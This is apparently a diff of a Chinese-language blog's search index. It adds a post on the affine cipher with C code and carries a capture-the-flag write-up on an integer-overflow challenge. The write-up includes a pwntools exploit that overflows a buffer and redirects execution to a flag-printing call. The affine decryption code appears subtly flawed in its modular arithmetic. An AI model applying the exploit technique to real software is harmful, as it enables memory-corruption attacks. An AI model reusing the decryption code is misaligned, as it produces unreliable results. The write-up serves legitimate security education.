@@ -1,6 +1,19 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title><![CDATA[仿射密码]]></title>
+    <url>%2F2019%2F10%2F19%2F%E4%BB%BF%E5%B0%84%E5%AF%86%E7%A0%81%2F</url>
+    <content type="text"><![CDATA[0x01 算法原理仿射密码是一种表单代换密码，字母表的每个字母相应的值使用一个简单的数学函数对应一个数值，再把对应数值转换成字母。 加密函数：E(x) = (ax + b) (mod m)，其中 a与b互质，m是编码系统中字母的个数（通常都是26）。 解密函数：D(x) = a^{-1} (x - b) (mod m)，其中 a^{-1} 是 a 在Z_{m}群的乘法逆元。 a,b是密钥，为满足0≤a,b≤25和gcd(a,26)等于1的整数。a-1表示a的逆元，即a-1*a ≡ 1mod26 0x02 算法实现（加密与解密）1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253#include&lt;stdio.h&gt;#include&lt;string.h&gt;#define N 100int main()&#123; char m[N+1],c[N+1]; int k1,k2; printf(&quot;请输入原文:&quot;);//以回车（换行）作为字符串读取的结束,默认遇空格、回车、跳格键结束。 scanf(&quot;%[^\n]&quot;,m);//开始加密 printf(&quot;\n请输入密钥k1,k2:&quot;);//一次读取多个数值时的格式设置,默认以空格、回车分隔数值，若想以逗号分隔不同数值则需在&quot;&quot;内将格式设置为&quot;%d,%d&quot;，如scanf(&quot;%d,%d&quot;,&amp;k1,&amp;k2)则输入时仅以逗号分隔。 scanf(&quot;%d%d&quot;,&amp;k1,&amp;k2); for (int i=0;i&lt;strlen(m);i++) &#123;////&apos;a&apos;对应97,&apos;A&apos;对应65. 以下两式子等价 //c[i]=(m[i]-&apos;a&apos;+k2)%26+97;//c[i]=(m[i]-97+k2)%26+97; if(m[i]&gt;=&apos;A&apos;&amp;&amp;m[i]&lt;=&apos;Z&apos;) c[i]=&apos;A&apos;+(k1*(m[i]-&apos;A&apos;)+k2)%26; else if(m[i]&gt;=&apos;a&apos;&amp;&amp;m[i]&lt;=&apos;z&apos;) c[i]=&apos;a&apos;+(k1*(m[i]-&apos;a&apos;)+k2)%26; else c[i]=m[i]; //单字符输出每一个密文： &#125; printf(&quot;\n密文是: %s&quot;,c); int r0=26,t0=0,t1=1,r1=k1,r2,t2,q; while(r1!=0) &#123; q=r0/r1; r2=r0-q*r1; t2=t0-q*t1; r0=r1;r1=r2; t0=t1;t1=t2; &#125; int k1_inv=t0;//扩展欧几里得算法求逆元 printf(&quot;\n逆元 %d mod %d 是: %d&quot;,k1,r0,t0); for (int i=0;i&lt;strlen(c);i++) &#123; if(c[i]&gt;=&apos;A&apos;&amp;&amp;c[i]&lt;=&apos;Z&apos;) m[i]=&apos;A&apos;+(t0*(c[i]-&apos;A&apos;)-k2)%26; else if(c[i]&gt;=&apos;a&apos;&amp;&amp;c[i]&lt;=&apos;z&apos;) m[i]=&apos;a&apos;+(t0*(c[i]-&apos;a&apos;)-k2)%26; else m[i]=c[i]; &#125;//解密 printf(&quot;\n原文是: %s&quot;,m); &#125;]]></content>
+      <categories>
+        <category>密码学</category>
+      </categories>
+      <tags>
+        <tag>密码学</tag>
+        <tag>古典密码</tag>
+        <tag>算法</tag>
+      </tags>
+  </entry>
+  <entry>
     <title><![CDATA[整形溢出 int_overflow]]></title>
     <url>%2F2019%2F10%2F17%2F%E6%95%B4%E5%BD%A2%E6%BA%A2%E5%87%BA-_int_overflow%2F</url>
     <content type="text"><![CDATA[0x01 C语言的整数溢出机制整数溢出主要分为无符号整数溢出和有符号整数溢出。 无符号整型溢出对于unsigned整型溢出，C的规范是有定义的——“溢出后的数会以2^(8*sizeof(type))作模运算”，也就是说，如果一个unsigned char（1字符，8bits）溢出了，会把溢出的值与256求模。 1234567#include &lt;stdio.h&gt;int main(int argc, const char * argv[]) &#123; // insert code here... unsigned char x; x = 128 + 130; printf(&quot;%d\n&quot;,x); &#125; 有符号整型溢出对于signed整型的溢出，C的规范定义是“undefined behavior”，虽然没有定义，各编译器可自己实现，但是大部分的溢出机制都是一样的。 有符号整型溢出又可分为向上溢出和向下溢出。假设用k个字节表示一个整型变量, 那么这个变量可以表示的有符号整数的范围是-2^(8k-1) ~ 2^(8k-1) – 1,那么两个正整数或者两个负整数相加就有可能超过这个整型变量所能表示的范围, 向上超出&gt;2^(8k-1) – 1我们称之为向上溢出, 向下超出&lt;-2^(8k-1), 我们称之为向下溢出.对于signed char,正整数最大值为127，负整数最小值为128。unsigned char所能表示的最大值为255。 12signed char x;x = 125 + 5; 上面代码会输出：-126，因为130的二进制位为10000010，符号为1，表示负数。对于有符号整型，负数是用补码表示的，即绝对值取反后加一。根据之前方法逆向回去，先减一后再取反得01111110，即126.所以10000010表示的是-126。 12signed char x;x = (-100) + (-100); 上面代码会输出56，因为200的二进制为11001000，-200根据补码的算法，得出00111000即56。上面的两个例子无论是向上溢出还是向下溢出，绝对值都在相对于无符号整型能表示的范围内。对于signed char如果结果为400，超出了位数表示范围，取结果的低八位。 12signed char x;x = 200 + 200; 因此上面代码会输出-112。如果x的结果为负数且超出了255，则取结果的低八位，并进行补码的反向操作，减一后取反。 数据类型范围• 2015/06/09Visual C++ 32 位和 64 位编译器可识别本文后面的表中的类型。 • int (unsigned int) • __int8 (unsigned __int8) • __int16 (unsigned __int16) • __int32 (unsigned __int32) • __int64 (unsigned __int64) • short (unsigned short) • long (unsigned long) • long long (unsigned long long)如果其名称以两个下划线 (__) 开始，则数据类型是非标准的。下表中指定的范围均包含起始值和结束值。 0x02 _int_overflow检查安全机制运行一下，我们知道这是一个创建用户名和密码的程序，对用户名的长度和密码都有限制。我们ctrl+1 找到了system（”cat flag”） 找到溢出点 strcpy：危险函数unsigned __int8最大只能到达255 可是我们read（。。。）远超过255。 利用思路整数溢出要想利用到strcpy这一步，要么你输入的passwd长度&gt;3 &amp;&amp; &lt;=8，要么使passwd的长度过长，而v3最大可以存的长度为255，所以直接在v3处造成整数溢出进入else，整数溢出需要255，返回地址需要4字节，所以passwd长度达到259即可第一种passwd太短，无法利用进行改写程序流，我们使用第二种思路。程序中存在，可以将返回地址指向what_is_this()。 1.发现v3是8位无符号整数，则最大只能是255。但是read函数能读取的长度是0x199，远大于255，那就可以进行整型溢出，让passwd的长度是 260到264就可以了。根据无符号整形溢出规则，溢出则进行2^(8*sizeof(type))作模运算，passwd的长度是 260到264。2.我们将程序的返回地址覆盖为system（”cat flag”） EXP:12345678910111213141516171819from pwn import*p = process(&apos;./int_overflow&apos;)system_flag_addr = 0x804868Bp.recvuntil(&apos;choice:&apos;)p.sendline(&quot;1&quot;)p.recvuntil(&apos;username:\n&apos;)p.sendline(&quot;tutu&quot;)p.recvuntil(&apos;passwd:\n&apos;)payload = &apos;A&apos;*0x18 + p32(system_flag_addr)payload = payload.ljust(262,&apos;A&apos;) p.sendline(payload)p.interactive() Python ljust()方法Python 字符串 Python 字符串描述Python ljust() 方法返回一个原字符串左对齐,并使用空格填充至指定长度的新字符串。如果指定的长度小于原字符串的长度则返回原字符串。]]></content>
@@ -33,8 +46,8 @@
       </categories>
       <tags>
         <tag>密码学</tag>
-        <tag>数论</tag>
         <tag>算法</tag>
+        <tag>数论</tag>
         <tag>欧几里得算法</tag>
       </tags>
   </entry>
